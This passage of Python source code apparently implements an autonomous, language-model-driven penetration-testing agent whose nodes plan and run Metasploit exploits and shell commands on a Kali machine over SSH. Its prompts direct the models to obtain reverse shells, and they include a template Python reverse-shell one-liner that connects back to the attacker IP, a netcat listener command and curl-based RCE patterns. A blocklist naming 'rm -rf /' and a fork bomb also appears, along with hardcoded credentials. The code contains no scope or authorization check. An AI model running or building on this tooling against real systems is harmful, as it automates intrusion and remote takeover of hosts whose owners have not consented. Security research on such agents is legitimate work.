"""
Red Team Multi-Node Agent - Refactored Architecture
Autonomous penetration testing with specialized nodes:
  recon_parser -> researcher -> planner ->
  parameter_solver -> executor -> critic -> (summarizer)
"""

import sys
import json
import re
import time
import operator
from typing import TypedDict, Annotated, List, Literal

import dotenv
import paramiko
from langchain_openai import ChatOpenAI
from langchain_core.messages import (
    BaseMessage, HumanMessage, SystemMessage, ToolMessage, AIMessage
)
from langchain_core.tools import tool
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langgraph.checkpoint.memory import MemorySaver
from langgraph.types import RetryPolicy

from tools.metasploit_tools import msf_session
from tools.rag import query_knowledge_base, add_to_knowledge_base, query_successful_attacks
from tools.service_mapping import match_exploits

# =============================================================================
# CONFIGURATION
# =============================================================================

dotenv.load_dotenv()

MODEL_NAME = "gpt-4o-mini"
KALI_IP = "192.168.34.6"
KALI_USER = "kali"
KALI_PASS = "kali"
MSF_PORT = 55553
MSF_USER = "kali"
MSF_PASS = "kali"

MAX_RETRIES = 5
MAX_EXECUTOR_TOOL_CALLS = 15
MAX_RESEARCHER_TOOL_CALLS = 10
TOKEN_SENSITIVE_THRESHOLD = 100000
HEAVY_MESSAGE_THRESHOLD = 20000

FORBIDDEN_COMMANDS = ["rm -rf /", ":(){ :|:& };:"]

# =============================================================================
# CONSOLE COLORS
# =============================================================================

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def print_colored(text: str, color: str):
    """Print text with ANSI colors."""
    print(f"{color}{text}{Colors.ENDC}")

# =============================================================================
# SSH UTILITIES
# =============================================================================

def run_ssh_command(command: str) -> str:
    """Execute command on remote Kali machine via SSH."""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(KALI_IP, username=KALI_USER, password=KALI_PASS, timeout=10)
        stdin, stdout, stderr = ssh.exec_command(command)

        output_lines = []
        for line in iter(stdout.readline, ""):
            output_lines.append(line)

        err_output = stderr.read().decode()
        exit_status = stdout.channel.recv_exit_status()
        full_output = "".join(output_lines).strip()

        if exit_status == 0:
            if not full_output:
                return (
                    f"Command '{command}' executed successfully but returned NO OUTPUT.\n"
                    f"CRITICAL: You must receive output to verify results.\n"
                    f"REACTION REQUIRED: Check log files or use verbose flags."
                )
            return f"Command '{command}' succeeded.\nOutput:\n{full_output}"
        else:
            return f"Command '{command}' failed (Exit Code: {exit_status}).\nError:\n{err_output}"

    except Exception as e:
        return f"SSH Connection/Execution Error: {str(e)}"
    finally:
        ssh.close()

# =============================================================================
# STATE DEFINITION
# =============================================================================

class AgentState(TypedDict):
    messages: Annotated[List[BaseMessage], operator.add]
    raw_recon: str             # Raw nmap/recon output from prior agent
    target_info: dict          # {ip, os, hostname, ports: [{port, state, service, version}]}
    current_plan: str          # Attack strategy from planner
    tool_candidate: dict       # {module, description, source} from planner
    execution_result: str      # Output from executor
    loop_step: int
    critic_verdict: str        # "PASS" | "FAIL_PARAM" | "FAIL_EXPLOIT" | "FAIL_CONTEXT"


class ExploitationFindings(TypedDict):
    """Structured output from run_exploitation() for parent killchain consumption."""
    success: bool              # Did we get a session?
    session_id: str            # e.g. "3" or ""
    session_type: str          # "command_shell" | "meterpreter" | ""
    target_ip: str
    target_port: str           # Port that was exploited
    exploit_used: str          # MSF module path or "manual:<desc>"
    access_level: str          # "user" | "root" | "unknown"
    summary: str               # Brief text of what happened
    failure_category: str      # "generic"|"wrong_targeturi"|"incompatible_payload"|"module_aborted"|""
    failure_cause: str         # Specific error phrase that classified the failure
    session_user_info: dict    # {"uid": "...", "user": "...", "raw": "..."} or {}

# =============================================================================
# TOOLS
# =============================================================================

@tool
def tool_metasploit_rpc(command: str):
    """
    Executes a command on the ACTIVE Metasploit console.
    State is preserved. You can run 'use exploit/...' in one turn,
    and 'set RHOST ...' in the next.

    **METASPLOIT USAGE**: You have a persistent console session open.
    1. You do NOT need to chain commands with ';'. This is an interactive console,
       enter one command at a time. You can issue 'use exploit/...' then wait for the result.
    2. If a command fails (e.g. 'Unknown command'), check your spelling or context.
    **CRITICAL** 3. When ready to attack YOU MUST ALWAYS FIRST use 'show options'
       to verify that all the fields are set correctly.
    4. If you ran 'show options' and are SURE the options are set, run the exploit
       using 'run -z' (background) or just 'run'.
    5. ALWAYS check the output. If it says 'Exploit completed, but no session',
       it FAILED. Try a different payload or target.
    **CRITICAL** 6. After obtaining a reverse shell session, you should ALWAYS run
       'exit' command to put the session in background.
    """
    try:
        return msf_session.send_command(command)
    except Exception as e:
        return f"RPC Error: {str(e)}"


@tool
def tool_linux_terminal(command: str):
    """
    Executes a shell command on the remote Linux (Kali) terminal via SSH.

    **CRITICAL REQUIREMENT - NON-INTERACTIVE ONLY**:
    You MUST NOT use interactive or blocking commands (dangling commands).
    The terminal environment cannot handle prompts (e.g., password prompts, 'yes/no' confirmations).

    FORBIDDEN:
    - 'ftp [IP]' (Use 'curl' or 'wget' for file transfers instead).
    - 'ssh [User]@[IP]' (Use 'sshpass' if available, or MSF modules).
    - 'top', 'htop', 'nano', 'vi', or any command that starts a continuous UI.
    - Commands that wait for user input indefinitely.

    ALWAYS prefer non-interactive flags (e.g., 'apt-get install -y' instead of 'apt-get install').
    """
    if any(bad in command for bad in FORBIDDEN_COMMANDS):
        return "Command blocked by safety guardrails."
    print_colored(f"\n[Terminal Tool] Executing: {command}", Colors.OKCYAN)
    return run_ssh_command(command)


# Tool sets for different nodes
RESEARCHER_TOOLS = [query_successful_attacks, query_knowledge_base, add_to_knowledge_base]
EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc]

# =============================================================================
# SYSTEM PROMPTS
# =============================================================================

RECON_PARSER_PROMPT = f"""You are a recon data parser for a Red Team agent. Your IP is {KALI_IP}.

Your ONLY job: extract structured JSON from the user's nmap/recon output.

Output EXACTLY this JSON format (no extra text, no markdown fences):
{{
  "ip": "<target IP>",
  "os": "<detected OS or 'unknown'>",
  "hostname": "<hostname or 'unknown'>",
  "ports": [
    {{"port": <int>, "state": "open", "service": "<service name>", "version": "<version string>"}},
    ...
  ]
}}

Rules:
- Only include ports with state "open"
- If version is unknown, use empty string ""
- Extract OS from aggressive OS guesses or service info
- If multiple IPs, use the primary target (not your own IP {KALI_IP})
"""

PLANNER_PROMPT = f"""You are a Red Team Strategic Planner. Your attacker IP is {KALI_IP}.

You receive:
1. USER OBJECTIVE — what the operator wants (e.g., "get a reverse shell using python")
2. TARGET INFO — IP, OS, ports/services
3. RESEARCH RESULTS — exploit intelligence from the knowledge base (viable modules, CVEs, compatibility notes)

Your job: interpret user intent, evaluate research results for compatibility, and select ONE attack vector.

**PRIORITIZATION**: If the research results include HIGH-CONFIDENCE deterministic matches (from service fingerprints),
prefer those over RAG-sourced or general-knowledge exploits unless they've already been tried and failed.

**Rules:**
1. **USER INTENT IS THE PRIMARY DECISION DRIVER** — if the user specifies a payload type (e.g., "python reverse shell"), language, technique, or module, the chosen approach MUST actually deliver that. If no MSF module supports the user's preferred payload type for the target service, you MUST switch to approach "manual" instead of forcing an incompatible MSF payload.
2. EVALUATE COMPATIBILITY — check each research result against the target:
   - Does the exploit match the target OS? (no Windows exploits for Linux)
   - Does it match the service VERSION on the target?
   - Is the MSF module path valid?
   - **Does the module support the user's preferred payload type?** Check the researcher's compatibility notes for supported payload types.
3. Pick the most promising compatible exploit
4. Specify the MITRE ATT&CK technique ID
5. If retrying after failure, MUST choose a DIFFERENT approach
6. SCOPE: Exploitation only — no recon/scanning
7. **CHOOSE APPROACH** — select "msf" (Metasploit module) or "manual" (Linux terminal commands):
   - Use "msf" when a compatible MSF module exists that supports the user's needs
   - Use "manual" when the user wants a payload type no MSF module supports, or when MSF has already failed and a manual approach is more promising
   - Manual approach uses tool_linux_terminal for netcat listeners, crafted reverse shells, curl-based RCE, etc.

Output your plan in TWO parts:

PART 1 — Strategy (2-4 sentences):
- Target service and port
- Expected vulnerability / CVE
- How user preferences were incorporated
- Why msf or manual approach was chosen

PART 2 — Selected module as JSON (no markdown fences):
{{"module": "<full MSF module path or null>", "description": "<one-line description>", "source": "<RAG or general_knowledge>", "approach": "msf or manual"}}
"""

RESEARCHER_PROMPT = """You are a Red Team Intelligence Researcher with access to exploitation knowledge bases, guided by the user's objective.

Your job: query the knowledge bases to find viable exploits for the target's services and versions, prioritizing approaches that match the user's stated preferences.

**Available tools:**
- `query_successful_attacks`: Database of PROVEN past successful attacks from previous runs — call this FIRST
- `query_knowledge_base`: Main knowledge base of Metasploit modules, CVEs, and exploitation techniques
- `add_to_knowledge_base`: Store useful findings for future retrieval

**Query strategy — follow this order:**
1. FIRST, call `query_successful_attacks` for the most promising services. Past successes are the highest-value intelligence — a proven exploit saves entire cycles of trial and error. Query one service at a time (e.g., "ProFTPD 1.3.5 remote code execution").
2. THEN, call `query_knowledge_base` for the same services AND any additional services not covered. It is fine and expected to query the same service on both tools — successful_attacks tells you what worked before, the main DB gives you broader options.

**Rules:**
1. **USER INTENT PRIORITY**: If the user specifies a payload type (e.g., "python reverse shell"), technique, or approach, prioritize services and modules that support that payload/technique. Query specifically for compatible modules.
2. Construct VERBOSE queries for each interesting service — include service name, version, OS
   - BAD: "Samba exploit"
   - GOOD: "Remote code execution exploit for Samba 4.3.11 on Ubuntu Linux"
3. Prioritize services with known-vulnerable versions (e.g., ProFTPD 1.3.5, UnrealIRCd, Samba 4.3.x)
4. You have a MAXIMUM of 5 queries total across both tools. Cover DIVERSE services — do not spend all queries on one service. If the target has 5+ interesting ports, spread your queries across them.
5. **GENERAL KNOWLEDGE FALLBACK**: If the knowledge base returns poor results, provide your summary using general knowledge of Metasploit modules and known CVEs.
6. **MANUAL TECHNIQUES**: Note where manual exploitation (netcat, crafted payloads, curl-based RCE) may be viable, especially if MSF modules don't support the user's preferred payload type.
7. **DETERMINISTIC MATCHES**: If HIGH-CONFIDENCE EXPLOIT MATCHES are provided in the context,
   these are pre-verified service-to-exploit mappings. Include them in your summary as top candidates.
   Focus your RAG queries on services NOT covered by deterministic matches.
8. When done, respond with a TEXT SUMMARY (no tool calls) listing all viable exploits found:
   - MSF module path for each
   - Compatible payload types (e.g., cmd/unix/reverse_python, cmd/unix/reverse_perl)
   - Required parameters
   - Target service/version/OS compatibility
   - Any version constraints or caveats
   - How findings align with the user's objective"""


PARAMETER_SOLVER_PROMPT = f"""You are a Red Team Parameter Configuration Specialist. Your attacker IP is {KALI_IP}.

You receive:
1. ATTACK PLAN — the planner's strategy including payload preferences and approach (msf or manual)
2. tool_candidate (MSF module path + description + approach)
3. target_info (IP, OS, ports)
4. Any critic feedback from previous attempts

**If approach is "msf" (Metasploit):**

Generate the EXACT sequence of Metasploit commands to configure and run the exploit.

**Mandatory rules:**
1. ALWAYS set: RHOSTS/RHOST <target_ip>, LHOST {KALI_IP}, LPORT 4444
2. Include 'show options' BEFORE 'run' to verify configuration
3. If the module needs specific options (TARGETURI, SITEPATH, etc.), set them based on the target info and your expert knowledge
4. If tool_candidate.module is null, use your general Metasploit knowledge to select and configure an appropriate module
5. If retrying after critic feedback, READ the feedback and adjust the specific parameter that was wrong
6. FOLLOW THE ATTACK PLAN — if the plan specifies a payload type (e.g., "Python reverse shell"), set the matching payload (e.g., 'set payload cmd/unix/reverse_python')
7. **CRITICAL: LHOST and LPORT are PAYLOAD options, not exploit options — you MUST select a payload first before setting them.**

Output the command sequence as a numbered list, one command per line:
1. use <module>
2. show payloads                    ← discover compatible payloads EARLY
3. set payload <compatible_payload> ← BEFORE LHOST/LPORT
4. set RHOSTS <target_ip>
5. set LHOST {KALI_IP}
6. set LPORT 4444
7. [any additional set commands]
8. show options
9. run

**If approach is "manual" (Linux terminal):**

Generate the EXACT sequence of Linux terminal commands for a manual attack (no Metasploit).

Examples of manual attack patterns:
- Netcat listener: `nohup nc -lvnp 4444 > /tmp/shell_output.txt 2>&1 &`
- Python reverse shell trigger via vulnerable service: `echo 'AB; python -c "import socket,subprocess,os;s=socket.socket(...);s.connect((\"{KALI_IP}\",4444));..." | nc <target_ip> <port>`
- Curl-based RCE: `curl http://<target_ip>:<port>/vulnerable_endpoint -d 'payload=...'`
- Crafted payloads via bash, perl, python, ruby

Output the command sequence as a numbered list, one command per line. Each command should use tool_linux_terminal.
"""

EXECUTOR_PROMPT = f"""You are a Red Team Execution Specialist. Your attacker IP is {KALI_IP}.

You have access to the Metasploit console and a Linux terminal. Execute the attack plan step by step.

**Rules:**
1. Issue ONE command at a time via the appropriate tool
2. READ each command's output carefully before issuing the next
3. If you see "session X opened" — that is SUCCESS. Report it immediately.
4. If you see "no session was created", "Exploit failed", or "Connection refused" — that is FAILURE
5. Do NOT blindly run the full sequence — adapt based on output
6. After obtaining a session, run 'exit' to background it
7. When done (success or failure), provide a text assessment of what happened

**Error Recovery:**
8. When you see a [SYSTEM HINT] in tool output, follow its instructions immediately — do NOT skip it
9. If you hit the same error twice (even with different payloads), STOP and provide a text assessment.
   Module/environment errors (e.g., "directory not writable", "Exploit aborted") cannot be fixed by
   switching payloads — report the failure and let the critic route to a different exploit
10. General best practice: after `use <module>`, run `show payloads` EARLY to discover compatible payloads

**Manual Attack Rules:**
11. Do NOT install packages (no apt-get, no pip, no gem). Use only tools already available on Kali.
12. If the attack plan specifies a MANUAL approach (not MSF), use `tool_linux_terminal` for all commands instead of `tool_metasploit_rpc`.
13. For listener setup in manual mode, use backgrounded commands (e.g., `nohup nc -lvnp 4444 > /tmp/shell_output.txt 2>&1 &`) to avoid blocking the terminal.

**Success indicators:** "Command shell session X opened", "Meterpreter session X opened"
**Failure indicators:** "Exploit completed, but no session", "Connection refused", "Unknown command"
"""

CRITIC_PROMPT = f"""You are a Senior Red Team Lead evaluating attack execution. Your IP is {KALI_IP}.

You receive the execution_result, session detection flag, and recent tool outputs.

**IMPORTANT: The SESSION_DETECTED flag is parsed directly from Metasploit output. If SESSION_DETECTED is True, a session was successfully opened — this is authoritative.**

**Classify the outcome as EXACTLY ONE of:**

1. **PASS** — SESSION_DETECTED is True. Use this ONLY when a session was actually opened. Never use PASS for a giving-up / unfixable case.

2. **FAIL_PARAM** — The module is correct but parameters were misconfigured on the LAST attempt.
   FAIL_PARAM is ONLY for: missing LHOST, wrong RHOST/RPORT, or unset required options.
   Do NOT use FAIL_PARAM for:
     (a) 'bad-config: No cookie found' / TARGETURI errors when multiple TARGETURI values have already been tried — classify as FAIL_EXPLOIT instead.
     (b) incompatible payload errors ("not a compatible payload") — classify as FAIL_EXPLOIT.
     (c) the same module failing repeatedly with the same module-level error after payload swaps — that is FAIL_EXPLOIT.

3. **FAIL_EXPLOIT** — The exploit module itself is wrong for this target. Includes: version mismatch, OS mismatch, AND the same module failing repeatedly with a non-parameter error (e.g., "directory not writable", "Exploit aborted") even after payload swaps. FAIL_EXPLOIT ALSO includes: the module hard-aborts with bad-config (no cookie) regardless of TARGETURI tried, OR the payload is not compatible with the module after trying 2+ payloads.

4. **FAIL_CONTEXT** — The message history is bloated and the agent is clearly confused or looping.

5. **FAIL_EXHAUSTED** — No session was opened AND the error is genuinely unfixable after exhausting all reasonable alternatives (target down, port closed, service confirmed not vulnerable, all viable modules tried). This is the giving-up verdict — it is a FAILURE, not a success. Use this instead of PASS when there is no session and nothing more to try.

**Output format (ALL fields required):**

CLASSIFICATION: <PASS|FAIL_PARAM|FAIL_EXPLOIT|FAIL_CONTEXT|FAIL_EXHAUSTED>

WHAT_FAILED: <module path and specific error messages from the execution>

TRIED_SO_FAR: <list of payloads/approaches tried and their outcomes>

ROOT_CAUSE: <your diagnosis of WHY it failed — parameter issue vs module incompatibility vs target configuration>

DO_NOT_REPEAT: <specific modules, payloads, or approaches that were tried and failed — the next attempt MUST avoid these>

NEXT_ACTION: <specific, actionable instruction for the next node — e.g., "Switch to exploit/unix/irc/unreal_ircd_3281_backdoor on port 6697 which supports cmd/unix/reverse_python" or "Set SITEPATH to /var/www/html instead of the default">
"""

SUMMARY_PROMPT = """You are a Senior Red Team Lead. Summarize the penetration testing history below.
Keep technical details: IPs, ports, CVEs, specific failed/successful exploits and module paths.
Note which approaches were tried and why they failed.
Be extremely concise to save tokens."""

COMPRESS_PROMPT = """Summarize this technical output. Keep all IP addresses, port numbers,
vulnerability IDs (CVEs), specific error codes, and MSF module paths. Remove redundant logs or fluff.
Return a technical summary of the 'Results Found'."""

def _extract_failed_exploits(messages) -> list:
    """Extract DO_NOT_REPEAT module paths from all critic feedback in message history.

    Handles formats:
      - Bullet list:    "- exploit/unix/..."
      - Numbered list:  "1. exploit/unix/..."
      - Inline CSV:     "DO_NOT_REPEAT: `mod1`, `mod2`"
    """
    failed = []
    for msg in messages:
        content = msg.content if hasattr(msg, 'content') and msg.content else ""
        if "DO_NOT_REPEAT" not in content:
            continue
        lines = content.split('\n')
        in_do_not_repeat = False
        for line in lines:
            stripped = line.strip()
            if 'DO_NOT_REPEAT' in line:
                in_do_not_repeat = True
                # Check for inline items on the same line
                after = line.split('DO_NOT_REPEAT', 1)[1].lstrip(':').strip()
                # Extract backtick-wrapped items
                items = re.findall(r'`([^`]+)`', after)
                if items:
                    for item in items:
                        item = item.strip()
                        if item and ('/' in item or item.startswith('cmd')):
                            failed.append(item)
                    continue
                # Fallback: comma-separated without backticks
                for part in after.split(','):
                    item = part.strip().strip('`').strip()
                    if item and ('/' in item or item.startswith('cmd')):
                        failed.append(item)
                continue
            if in_do_not_repeat:
                # Stop at empty line or new section header (e.g. "NEXT_ACTION:")
                if not stripped or (re.match(r'^[A-Z_]+:', stripped) and '/' not in stripped):
                    in_do_not_repeat = False
                    continue
                # Numbered list: "1. exploit/unix/..." or "1) exploit/..."
                if re.match(r'^\d+[\.\)]\s*', stripped):
                    item = re.sub(r'^\d+[\.\)]\s*', '', stripped).strip('`').strip()
                    if item and ('/' in item or item.startswith('cmd')):
                        failed.append(item)
                    continue
                # Bullet list: "- exploit/unix/..."
                if stripped.startswith('-'):
                    item = stripped.lstrip('- ').strip('`').strip()
                    if item and ('/' in item or item.startswith('cmd')):
                        failed.append(item)
                    continue
    return list(dict.fromkeys(failed))  # Deduplicate preserving order


MSF_ERROR_INDICATORS = [
    "Exploit completed, but no session",
    "Exploit aborted",
    "Exploit failed",
    "Unknown datastore option",
    "is not valid",
    "not a compatible payload",
    "payload has not been selected",
    "OptionValidateError",
    "Handler failed to bind",
]

# Ordered list of (regex, failure_category) — first match wins. More specific
# patterns come first so generic catch-alls do not shadow them.
FAILURE_PATTERNS = [
    (re.compile(r'not a compatible payload', re.IGNORECASE), "incompatible_payload"),
    (re.compile(r'incompatible payload', re.IGNORECASE), "incompatible_payload"),
    (re.compile(r'(cookie not found.*targeturi|no cookie found|bad-config:\s*no cookie)', re.IGNORECASE), "wrong_targeturi"),
    (re.compile(r'targeturi', re.IGNORECASE), "wrong_targeturi"),
    (re.compile(r'exploit aborted', re.IGNORECASE), "module_aborted"),
    (re.compile(r'no session was created', re.IGNORECASE), "generic"),
    (re.compile(r'exploit completed, but no session', re.IGNORECASE), "generic"),
]


def _classify_failure_from_messages(messages) -> tuple:
    """Scan ToolMessage contents for known MSF failure patterns.

    Returns (failure_category, failure_cause). Scans most-recent-first so the
    latest failure dominates. Returns ("generic", "") when nothing matches.
    """
    # First pass: scan raw tool outputs (most authoritative).
    for msg in reversed(messages):
        if not isinstance(msg, ToolMessage):
            continue
        content = msg.content if msg.content else ""
        if not content:
            continue
        for pattern, category in FAILURE_PATTERNS:
            m = pattern.search(content)
            if m:
                # Capture a short surrounding phrase for failure_cause
                start = max(0, m.start() - 30)
                end = min(len(content), m.end() + 30)
                phrase = content[start:end].strip().replace("\n", " ")
                cause = "" if category == "generic" else phrase
                return (category, cause)

    # Second pass: the executor's forced text assessment (AIMessage) or critic
    # feedback may name the failure phrase when the raw ToolMessage was
    # compressed/truncated or never produced (safety-valve path). Scan
    # non-tool-call AIMessage contents for the same patterns so the orchestrator
    # gets a distinguishing category instead of a blank ('generic', '').
    for msg in reversed(messages):
        if not isinstance(msg, AIMessage):
            continue
        if getattr(msg, "tool_calls", None):
            continue
        content = msg.content if msg.content else ""
        if not content:
            continue
        for pattern, category in FAILURE_PATTERNS:
            m = pattern.search(content)
            if m:
                start = max(0, m.start() - 30)
                end = min(len(content), m.end() + 30)
                phrase = content[start:end].strip().replace("\n", " ")
                cause = "" if category == "generic" else phrase
                return (category, cause)
    return ("generic", "")


def _extract_session_user_info(messages) -> dict:
    """Scan ToolMessage contents for uid=...(user) patterns to capture identity.

    Returns {"uid": "0", "user": "root", "raw": "uid=0(root)"} or {}.
    """
    for msg in reversed(messages):
        if not isinstance(msg, ToolMessage):
            continue
        content = msg.content if msg.content else ""
        if not content:
            continue
        m = re.search(r'uid=(\d+)\((\w+)\)', content)
        if m:
            return {"uid": m.group(1), "user": m.group(2), "raw": m.group(0)}
    return {}

ERROR_ANALYZER_PROMPT = """You are a Metasploit error analyst. Analyze this tool output and provide a ONE-SENTENCE recovery hint.

Rules:
- If LHOST/LPORT is an "Unknown datastore option" → select a payload first with 'set payload <name>'
- If a payload "is not valid" → run 'show payloads' to see compatible ones
- If "not a compatible payload" appears → this payload is incompatible with this module. Run 'show payloads' immediately to discover which payloads ARE compatible, then select one from the list. Do NOT guess another payload from memory.
- If the exploit ABORTED (e.g., "directory not writable", config error) → this is a MODULE-level failure, switching payloads will NOT help. Tell the user to STOP and report failure.
- If the exploit completed but no session was created (and did NOT abort) → the payload didn't connect back, suggest a different payload type
- If a handler failed to bind → the port is already in use, suggest changing LPORT
- For any other error, give your best contextual advice based on the output

Output ONLY: [SYSTEM HINT: <your one-sentence advice>]"""

# =============================================================================
# LLM HELPERS
# =============================================================================

def call_llm(
    messages: List[BaseMessage],
    system_prompt: str = None,
    tools: List = None,
    model_name: str = MODEL_NAME,
    temperature: float = 0
) -> BaseMessage:
    """Invoke LLM with optional system prompt and tools."""
    model = ChatOpenAI(model=model_name, temperature=temperature)

    if tools:
        model = model.bind_tools(tools)

    full_messages = []
    if system_prompt:
        full_messages.append(SystemMessage(content=system_prompt))
    full_messages.extend(messages)

    return model.invoke(full_messages)

# =============================================================================
# JSON PARSING HELPER
# =============================================================================

def parse_json_response(text: str) -> dict:
    """Extract JSON from LLM response with fallback for markdown fences."""
    if not text:
        return {}

    # Try direct parse
    try:
        return json.loads(text.strip())
    except (json.JSONDecodeError, ValueError):
        pass

    # Try extracting from ```json ... ``` blocks
    match = re.search(r'```(?:json)?\s*\n?(.*?)\n?\s*```', text, re.DOTALL)
    if match:
        try:
            return json.loads(match.group(1).strip())
        except (json.JSONDecodeError, ValueError):
            pass

    # Try finding first { ... } block
    match = re.search(r'\{.*\}', text, re.DOTALL)
    if match:
        try:
            return json.loads(match.group(0))
        except (json.JSONDecodeError, ValueError):
            pass

    return {}

# =============================================================================
# MESSAGE COMPRESSION
# =============================================================================

def summarize_history(messages: List[BaseMessage]) -> str:
    """Aggressively condense technical history."""
    history_str = ""
    for m in messages:
        content = m.content[:2000] if m.content else ""
        history_str += f"{type(m).__name__}: {content}\n"

    response = call_llm(
        messages=[HumanMessage(content=history_str)],
        system_prompt=SUMMARY_PROMPT
    )
    return response.content


def compress_large_message(message: BaseMessage) -> BaseMessage:
    """Compress a single large message while preserving technical data."""
    if not message.content or len(message.content) < HEAVY_MESSAGE_THRESHOLD:
        return message

    print_colored(
        f"--- Compressing heavy {type(message).__name__} ({len(message.content)} chars) ---",
        Colors.OKCYAN
    )

    input_content = message.content[:15000]
    response = call_llm(
        messages=[HumanMessage(content=input_content)],
        system_prompt=COMPRESS_PROMPT
    )

    new_content = f"[TECHNICAL SUMMARY OF PREVIOUS OUTPUT]: {response.content}"

    if isinstance(message, ToolMessage):
        return ToolMessage(content=new_content, tool_call_id=message.tool_call_id)
    if isinstance(message, AIMessage):
        return AIMessage(content=new_content, tool_calls=message.tool_calls)
    return HumanMessage(content=new_content)

# =============================================================================
# GRAPH NODES
# =============================================================================

def recon_parser_node(state: AgentState) -> dict:
    """Parse raw_recon data into structured target_info JSON."""
    raw_recon = state.get("raw_recon", "")

    if not raw_recon:
        print_colored("\n[Recon Parser] No recon data provided, skipping.", Colors.WARNING)
        return {"messages": [AIMessage(content="[Recon Parser] No recon data — planner will work from user objective only.")]}

    print_colored("\n[Recon Parser] Extracting target info from recon data...", Colors.HEADER)

    response = call_llm(
        messages=[HumanMessage(content=raw_recon)],
        system_prompt=RECON_PARSER_PROMPT
    )

    target_info = parse_json_response(response.content)

    if not target_info or "ip" not in target_info:
        # Fallback: try to extract IP at minimum
        ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', raw_recon)
        target_ip = ip_match.group(1) if ip_match else "unknown"
        # Skip our own IP
        if target_ip == KALI_IP:
            all_ips = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', raw_recon)
            target_ip = next((ip for ip in all_ips if ip != KALI_IP), "unknown")
        target_info = {"ip": target_ip, "os": "unknown", "hostname": "unknown", "ports": []}

    print_colored(f"[Recon Parser] Target: {target_info.get('ip')} | OS: {target_info.get('os')} | Ports: {len(target_info.get('ports', []))}", Colors.OKGREEN)

    summary_msg = f"[Recon Parser] Identified target {target_info.get('ip')} ({target_info.get('os', 'unknown')}) with {len(target_info.get('ports', []))} open ports."
    return {
        "messages": [AIMessage(content=summary_msg)],
        "target_info": target_info
    }


def planner_node(state: AgentState) -> dict:
    """Select attack vector based on research results, target_info, and user objective."""
    target_info = state.get("target_info", {})
    messages = state['messages']

    print_colored("\n[Planner] Selecting attack vector...", Colors.HEADER)

    # Get the user's original input (skip critic feedback and compressed history)
    user_input = ""
    for msg in messages:
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" not in msg.content and "COMPRESSED HISTORY" not in msg.content:
            user_input = msg.content
            break

    # Gather researcher's findings (text summary + tool messages)
    researcher_summary = ""
    rag_results = []
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and not msg.tool_calls and msg.content and "[Recon Parser]" not in msg.content:
            if not researcher_summary:
                researcher_summary = msg.content
        if isinstance(msg, ToolMessage):
            rag_results.append(msg.content[:1000])
        if isinstance(msg, AIMessage) and "[Recon Parser]" in (msg.content or ""):
            break

    # Extract failed exploits from ALL prior critic feedback
    failed_modules = _extract_failed_exploits(messages)

    # Build context for the planner — banned list goes FIRST
    context = ""
    if failed_modules:
        banned = '\n'.join(f'  - {m}' for m in failed_modules)
        context += (
            f"BANNED — THESE MODULES/PAYLOADS ALREADY FAILED. DO NOT SELECT THEM:\n"
            f"{banned}\n"
            f"You MUST choose a completely different exploit module.\n\n"
        )

    context += f"USER OBJECTIVE:\n{user_input}\n\n"
    context += f"TARGET INFO:\n{json.dumps(target_info, indent=2)}\n\n"
    context += f"RESEARCH RESULTS:\n{researcher_summary}\n\n"
    if rag_results:
        context += f"RAW RAG DATA:\n{'---'.join(rag_results)}\n\n"

    # Include any critic feedback from messages
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
            context += f"PREVIOUS FAILURE FEEDBACK:\n{msg.content}\n\n"
            break
        if isinstance(msg, AIMessage) and "CRITIC FEEDBACK" in msg.content:
            context += f"PREVIOUS FAILURE FEEDBACK:\n{msg.content}\n\n"
            break

    response = call_llm(
        messages=[HumanMessage(content=context)],
        system_prompt=PLANNER_PROMPT
    )

    plan = response.content
    print_colored(f"[Planner] Strategy: {plan[:200]}...", Colors.OKGREEN)

    # Extract tool_candidate JSON from planner output (PART 2)
    tool_candidate = parse_json_response(plan)
    if not tool_candidate:
        tool_candidate = {"module": None, "description": "No module selected", "source": "planner", "approach": "msf"}
    if "approach" not in tool_candidate:
        tool_candidate["approach"] = "msf"

    # --- HARD GUARDRAIL: reject banned modules ---
    selected_module = (tool_candidate.get("module") or "").strip()
    if selected_module and failed_modules:
        for banned in failed_modules:
            if banned.lower() in selected_module.lower() or selected_module.lower() in banned.lower():
                print_colored(
                    f"[Planner] GUARDRAIL: Rejected banned module '{selected_module}'. Forcing re-pick.",
                    Colors.WARNING,
                )
                # Re-prompt with a very explicit instruction
                override_msg = (
                    f"CRITICAL: You selected '{selected_module}' which has ALREADY FAILED and is BANNED.\n"
                    f"BANNED modules: {', '.join(failed_modules)}\n\n"
                    f"You MUST pick a DIFFERENT exploit module. Consider:\n"
                    f"- Samba (exploit/linux/samba/is_known_pipename) on port 445\n"
                    f"- UnrealIRCd (exploit/unix/irc/unreal_ircd_3281_backdoor) on port 6667\n"
                    f"- Manual approach (SSH brute force, web app exploit, etc.)\n\n"
                    f"TARGET INFO:\n{json.dumps(target_info, indent=2)}\n\n"
                    f"Output your plan in PART 1 (strategy) and PART 2 (JSON) format."
                )
                response2 = call_llm(
                    messages=[HumanMessage(content=override_msg)],
                    system_prompt=PLANNER_PROMPT,
                )
                plan = response2.content
                print_colored(f"[Planner] Re-picked strategy: {plan[:200]}...", Colors.OKGREEN)
                tool_candidate = parse_json_response(plan)
                if not tool_candidate:
                    tool_candidate = {"module": None, "description": "No module selected", "source": "planner", "approach": "msf"}
                if "approach" not in tool_candidate:
                    tool_candidate["approach"] = "msf"
                break

    return {
        "messages": [AIMessage(content=f"[Planner] {plan}")],
        "current_plan": plan,
        "tool_candidate": tool_candidate,
        "execution_result": ""      # Clear for fresh cycle
    }


def _is_cycle_boundary(msg) -> bool:
    """Check if a message marks the start of a new researcher cycle."""
    content = msg.content or "" if hasattr(msg, 'content') else ""
    if isinstance(msg, AIMessage) and "[Recon Parser]" in content:
        return True
